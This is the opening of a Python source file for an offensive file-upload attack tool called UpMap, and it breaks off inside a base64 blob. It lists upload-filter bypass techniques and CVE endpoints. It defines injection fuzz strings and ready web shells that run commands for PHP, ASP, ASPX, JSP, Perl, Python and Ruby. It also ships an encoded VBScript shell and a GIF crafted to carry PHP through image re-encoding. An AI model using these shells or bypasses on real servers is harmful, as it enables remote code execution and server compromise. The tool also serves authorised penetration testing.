#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UpMap.py — Unified File Upload Security Assessment Tool
Version 1.1 | Python 3 | Standalone | 50 Attack Modules

Combines and surpasses:
  • UploadScanner (Burp Extension)  — full attack surface, CVE coverage
  • Upload_Bypass                   — modular design, unique bypasses
  • fuxploider                      — threaded recon + detection
  • filepwner                       — request file parsing + baseline
  • rce-scanner                     — known CVE endpoint scanning
  • AutoShell                       — form auto-discovery

All confirmed gaps filled:
  • Systematic case variants (.PHP/.Php/.pHp/.PhP/.PHp)
  • Full 10-variant null byte set in BOTH positions
  • Stripping bypass (.p.phphp / .pphphp)
  • Dot URL-encoding (%2e / %252e)
  • Name overflow 255 + 236 bytes
  • Forward double extension (.allowed.malicious)
  • ColdFusion/Perl extensions
  • Path traversal in filename (../ and ..%2f)
  • Known CVE endpoints (PHPUnit, ThinkPHP, Laravel, FCKeditor, elFinder)
  • web.config overwrite (IIS/ASP.NET)
  • OAST/interactsh support (--oast URL)
  • PUT / PATCH HTTP methods
  • User-agent rotation from wordlist
  • Configurable rate limiting (ms)
  • Resume interrupted scans
  • Bulk multi-target scanning
  • Stop-on-first-hit or brute-force mode
  • Standalone (no Burp Suite required)
  • SVG SSRF via 18 element/attribute vectors + UNC/SMB NTLM leak
  • PHP disable_functions bypass (pcntl_exec, imap_open, LD_PRELOAD+mail,
    Shellshock, Exim, dl(), FastCGI/PHP-FPM, COM, mod_cgi)
  • PHP callback-function obfuscation (LandGrey array_map/array_filter/usort/
    call_user_func family + header/XOR/cookie-derived dispatch)

Usage:
  python UpMap.py -r request.txt -s "Upload successful" -E php -D /uploads/ --oast https://your.oast.url
  python UpMap.py -u http://target.com/upload --field file -s "success" -E php
  python UpMap.py --targets targets.txt -r req.txt -s "ok" -E php --threads 10
"""

import argparse
import base64
import concurrent.futures
import copy
import csv
import datetime
import io
import json
import os
import random
import re
import signal
import string
import struct
import sys
import threading
import time
import traceback
import zipfile
import zlib
from pathlib import Path
from urllib.parse import urljoin, urlparse, quote, unquote, parse_qsl, urlencode
from xml.sax.saxutils import escape as xml_escape

try:
    import requests
    from requests.exceptions import (
        SSLError, ConnectionError, Timeout, RequestException,
        ChunkedEncodingError, ContentDecodingError, ProxyError,
        TooManyRedirects,
    )
    requests.packages.urllib3.disable_warnings()
except ImportError:
    sys.exit("[-] Missing: pip install requests")

# Transient network errors worth retrying with backoff (host hiccups, resets,
# truncated/garbled responses, proxy blips). SSLError is handled separately
# (scheme fallback). 429/503 rate-limiting is handled by status code.
TRANSIENT_ERRORS = (
    ConnectionError, Timeout, ChunkedEncodingError, ContentDecodingError, ProxyError,
)

try:
    from bs4 import BeautifulSoup
    BS4 = True
except ImportError:
    BS4 = False

__version__ = "1.1.0"
__author__  = "UpMap -- Unified FileUpmap Tool"

# Per-tool identity (kept in lockstep with UpGen.TOOL_* / Upname.TOOL_*)
TOOL_NAME    = "UpMap"
TOOL_TAGLINE = "Unrestricted Upload Map"
TOOL_VERSION = __version__

# Force UTF-8 output on Windows (avoids cp1252 UnicodeEncodeError)
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 1 — COLORS & OUTPUT
# ─────────────────────────────────────────────────────────────────────────────

# ── ANSI palette ─────────────────────────────────────────────────────────────
R   = "\033[38;5;196m"   # bright red
G   = "\033[38;5;82m"    # matrix green
Y   = "\033[38;5;220m"   # gold / warning
B   = "\033[38;5;39m"    # electric blue
C   = "\033[38;5;51m"    # cyber cyan
M   = "\033[38;5;201m"   # hot magenta  (findings)
W   = "\033[1;97m"       # bold white
DG  = "\033[38;5;240m"   # dim grey
OR  = "\033[38;5;208m"   # orange accent
RS  = "\033[0m"

BLD = "\033[1m"          # bold
DIM = "\033[2m"          # dim

# ── Labelled print helpers ────────────────────────────────────────────────────
def success(msg): print(f"  {G}{BLD}[+]{RS} {W}{msg}{RS}")
def failure(msg): print(f"  {DG}[-]{RS} {DG}{msg}{RS}")
def info(msg):    print(f"  {C}{BLD}[*]{RS} {msg}")
def warn(msg):    print(f"  {Y}{BLD}[!]{RS} {Y}{msg}{RS}")
def err(msg):     print(f"  {R}{BLD}[ERR]{RS} {R}{msg}{RS}")

def found(msg):
    w = 68
    bar = f"{M}{'▓' * w}{RS}"
    print(f"\n{bar}")
    print(f"  {M}{BLD}[ UPLOAD ACCEPTED ]{RS}  {W}{BLD}{msg}{RS}")
    print(f"{bar}\n")

def section(title: str):
    """Print a styled section separator."""
    pad = (60 - len(title) - 2) // 2
    print(f"\n  {DG}{'─' * pad}{RS} {C}{BLD}{title}{RS} {DG}{'─' * pad}{RS}")

# 0xBugatti signature logo (cyan). Drawn in dot-art; the @0xbugatti credit line
# is accented separately. Kept as raw rows so leading whitespace is preserved.
LOGO_ART = [
    "                        ...........",
    "                   .....................",
    "               ..............................",
    "            .....................................",
    "          .......................................:.",
    "        ........................................::::.",
    "      .........................  ...............::::::.",
    "       .........   .     ......   ...............::::::.",
    "            .                      ................::::..",
    "                                   .......................",
    "                                   ..::....................",
    "                                   .:::::::.................",
    ".                                  .::::::::::::............",
    "..                           ..    ::::::::::::::::::.......",
    "..        ...              ..     .::::::::::::::::::.......",
    "..           .:.         .:.       :::::::::::::::::::......",
    "..             .:.      .:         .::::::::::::::::::......",
    " .               .:.  ..:          .::::::::::::::::........",
    " .                .:.  :.          .:::::::::::::::........",
    "                   :...:            .::..:::::::::........",
    "                    .....           .::.....::...........",
    "                   . .. .           ....................",
    "                   . ...            ...................",
    "                     .... .          .................",
    "                     :... ::::.      ...............",
    "                     : .:.00000:.     ............",
    "                  :::: ..:0000000::::::::......",
    "                 :000.  .:0000000000000000:",
    "                        .000000000000:",
    "                           .:00:.",
]

# "UUMAP" block-letter wordmark, centered beneath the emblem as a lockup.
WORDMARK = [
    "██╗   ██╗██╗   ██╗███╗   ███╗ █████╗ ██████╗",
    "██║   ██║██║   ██║████╗ ████║██╔══██╗██╔══██╗",
    "██║   ██║██║   ██║██╔████╔██║███████║██████╔╝",
    "██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ ",
    "╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     ",
    " ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ",
]

def banner():
    print()
    full_w = max(len(r) for r in LOGO_ART)

    def centered(plain: str, lead: str = "", trail: str = "") -> str:
        """Center plain text within the emblem's width (lead/trail = ANSI wraps)."""
        pad = max(0, (full_w - len(plain)) // 2)
        return f"  {' ' * pad}{lead}{plain}{trail}"

    # Emblem (cyan).
    for row in LOGO_ART:
        print(f"  {C}{row}{RS}")
    print()

    # UUMAP wordmark, centered under the emblem.
    wm_w = max(len(r) for r in WORDMARK)
    pad  = max(0, (full_w - wm_w) // 2)
    for row in WORDMARK:
        print(f"  {' ' * pad}{C}{BLD}{row}{RS}")
    print()

    # Tagline + centered author credit + shared version line.
    print(centered(TOOL_TAGLINE, lead=W, trail=RS))
    auth_pad = max(0, (full_w - len("by @0xbugatti")) // 2)
    print(f"  {' ' * auth_pad}{DG}by {RS}{M}{BLD}@0xbugatti{RS}")
    print(centered(f"v{TOOL_VERSION}", lead=DG, trail=RS))
    print()

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 2 — CONFIG / CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

# ── Extension lists ──────────────────────────────────────────────────────────
EXTENSIONS = {
    "php": ["php", "php2", "php3", "php4", "php5", "php6", "php7",
            "phtml", "phar", "pht", "phtm", "phps", "pgif",
            "inc", "hphp", "ctp", "module"],
    "asp": ["asp", "aspx", "config", "ashx", "asmx", "aspq",
            "axd", "cshtm", "cshtml", "rem", "soap",
            "vbhtm", "vbhtml", "asa", "cer", "shtml", "xamlx"],
    "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf", "wss", "do", "action"],
    "coldfusion": ["cfm", "cfml", "cfc", "dbm"],
    "perl": ["pl", "cgi"],
    "allow_list": ["jpg", "jpeg", "png", "gif", "pdf", "mp3",
                   "mp4", "txt", "csv", "svg", "xml", "xlsx", "bmp", "webp"],
    "com": ["com"],
}

def case_variants(ext: str) -> list:
    """Return all meaningful case variants for an extension."""
    e = ext.lower()
    variants = [
        e,
        e.upper(),                                          # .PHP
        e.capitalize(),                                     # .Php
        "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(e)),  # .PhP
        "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(e)),  # .pHp
        e[:2].upper() + e[2:],                              # .PHp
    ]
    return list(dict.fromkeys(variants))  # deduplicate, preserve order

# ── Null bytes (10 variants from filepwner + Upload_Bypass combined) ─────────
NULL_BYTES = [
    "\x00", "%00", ";", "%20", " ",
    "%0a", "%0d%0a", "/", ".\\", "...."
]

# ── Magic bytes (60+ formats) ─────────────────────────────────────────────────
MAGIC = {
    "jpg":   b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01",
    "jpeg":  b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01",
    "png":   b"\x89PNG\r\n\x1a\n",
    "gif":   b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;",
    "gif87": b"GIF87a\x01\x00\x01\x00\x80\x01\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
    "bmp":   b"BM",
    "pdf":   b"%PDF-1.4",
    "zip":   b"PK\x03\x04",
    "rar":   b"Rar!",
    "exe":   b"MZ",
    "docx":  b"PK",
    "xlsx":  b"PK",
    "mp3":   b"ID3",
    "wav":   b"RIFF",
    "mp4":   b"ftypisom",
    "avi":   b"RIFF",
    "mkv":   b"\x1a\x45\xdf\xa3",
    "tar":   b"ustar",
    "gz":    b"\x1f\x8b",
    "bz2":   b"BZh",
    "xz":    b"\xfd7zXZ\x00",
    "ico":   b"\x00\x00\x01\x00",
    "webp":  b"RIFF\x00\x00\x00\x00WEBP",
    "svg":   b"<svg",
    "xml":   b"<?xml",
    "html":  b"<!DOCTYPE html>",
    "php":   b"<?php",
    "asp":   b"<%\n",
    "sh":    b"#!/bin/bash",
    "py":    b"#!/usr/bin/env python",
    "pl":    b"#!/usr/bin/perl",
    "rb":    b"#!/usr/bin/env ruby",
    "class": b"\xca\xfe\xba\xbe",
    "doc":   b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
    "xls":   b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
    "ppt":   b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
    "psd":   b"8BPS",
    "tif":   b"II*\x00",
    "flac":  b"fLaC",
    "ogg":   b"OggS",
    "eps":   b"%!PS",
    "ai":    b"\xc5d",
    "woff":  b"wOFF",
    "woff2": b"wOF2",
    "swf":   b"CWS",
    "flv":   b"FLV",
    "txt":   b"\xef\xbb\xbf",
}

# ── MIME types ─────────────────────────────────────────────────────────────────
MIMES = {
    "php": "application/x-httpd-php",
    "phtml": "application/x-httpd-php",
    "phar": "application/x-httpd-php",
    "asp": "application/x-asp",  "aspx": "application/x-asp",
    "jsp": "application/jsp",    "jspx": "application/jsp",
    "cfm": "application/cfm",
    "pl":  "text/x-perl-script", "cgi": "text/x-perl-script",
    "py":  "text/x-python-script",
    "rb":  "text/x-ruby-script",
    "jpg": "image/jpeg",  "jpeg": "image/jpeg",
    "png": "image/png",   "gif": "image/gif",
    "bmp": "image/bmp",   "webp": "image/webp",
    "svg": "image/svg+xml",
    "pdf": "application/pdf",
    "zip": "application/zip",
    "xml": "application/xml",
    "html": "text/html",
    "txt": "text/plain",
    "csv": "text/csv",
    "mp4": "video/mp4",  "avi": "video/x-msvideo",
    "mp3": "audio/mpeg", "m3u8": "audio/mpegurl",
    "swf": "application/x-shockwave-flash",
    "htaccess": "text/plain",
    "com": "application/octet-stream",
}

def get_mime(ext: str) -> str:
    return MIMES.get(ext.lower().lstrip("."), "application/octet-stream")

# ── User Agents ───────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Wget/1.21.4",
]

# ── Known fuzzing strings (UploadScanner KNOWN_FUZZ_STRINGS + extras) ────────
FUZZ_STRINGS = [
    # Buffer overflow / length attacks
    "A" * 256, "A" * 1024, "A" * 4096, "A" * 20000, "A" * 65535,
    # Format string attacks
    "%x" * 256, "%n" * 256, "%s" * 256, "%s%n%x%d" * 256,
    "%.1024d", "%.2048d", "%.4096d", "%.8200d",
    "%99999999999s", "%99999999999d", "%99999999999x", "%99999999999n",
    "%99999999999s" * 200, "%99999999999d" * 200,
    "%99999999999x" * 200, "%99999999999n" * 200,
    "%08x" * 100, "%%20s" * 200, "%%20x" * 200, "%%20n" * 200, "%%20d" * 200,
    "%#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x",
    "%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%08x",
    # Special chars that crash parsers
    "'", "\\", "<", "+", "%", "$", "`",
    # Path traversal
    "../" * 20, ".../" * 20, "%2e%2e/" * 20, "....//....//....//",
    # Null bytes
    "\x00" * 100, "%00" * 50,
    # Metacharacters
    ";" * 100, "null", "undefined", "None", "true", "false",
    # Injection
    "<script>alert(1)</script>",
    "<?php system('id'); ?>",
    "${7*7}", "#{7*7}", "{{7*7}}", "{{config}}",
    # CRLF
    "\r\n" * 50, "%0d%0a" * 50,
    # Unicode abuse
    "\ufffd" * 100, "\u0000" * 50,
    # Regex DoS
    "(" * 50 + "a" * 50 + ")" * 50 + "+",
]

# ── PHP Web Shells ─────────────────────────────────────────────────────────────
SHELLS = {
    "php": b"<?php system($_GET['cmd']); ?>",
    "php_post": b"<?php system($_POST['cmd']); ?>",
    "php_obf":  b"<?php $f='sys'.'tem';$f($_GET['cmd']); ?>",
    "php_exec": b"<?php echo shell_exec($_GET['cmd']); ?>",
    "php_pass": b"<?php passthru($_GET['cmd']); ?>",
    "asp":  b'<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>',
    "aspx": b'<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(Request["c"],Request["a"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()); %>',
    "jsp":  b'<% out.println(Runtime.getRuntime().exec(request.getParameter("cmd")).toString()); %>',
    "jsp_el": b'${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),request.getParameter("cmd"))}',
    "pl":   b'#!/usr/bin/perl\nuse CGI;my $q=new CGI;print $q->header;print `$ENV{QUERY_STRING}`;',
    "py":   b'#!/usr/bin/env python3\nimport cgi,os\nprint("Content-type: text/html\\n")\nf=cgi.FieldStorage()\nprint(os.popen(f.getvalue("cmd","id")).read())',
    "rb":   b'#!/usr/bin/env ruby\nrequire "cgi"\nc=CGI.new\nputs c.header\nputs `#{c["cmd"]}`',
}

# ── ASP VBScript.Encode shell (static, fixed 'cmd' param) ───────────────────────
# A real Windows-Script-Encoder (#@~^…^#~@) encoded VBScript shell, used by the
# asp_obfuscation module. Encoding the live shell offline isn't reproducible
# without the encoder runtime, so this blob is shipped verbatim. Its embedded
# command parameter is fixed (it does not follow --cmd-param / --shell).
ASP_VBE_BLOB = (b'<%@ LANGUAGE = "VBScript.Encode"%>\r\n'
                b'<%#@~^IQAAAA==3X+^!Y\x7fMVK4msPM+5E\x7f/OcrSl\t[MM+Xrb+AsAAA==^#~@%>')

# ── GD re-encode-survivor GIF (CVE-class imagecreatefromgif() bypass) ───────────
# A tested GIF whose embedded PHP survives a GD imagecreatefromgif()+imagegif()
# round-trip (sourced from FileUpload-Ideas/CheckThose). Used by php_rce.
GD_SURVIVOR_GIF = base64.b64decode(
    "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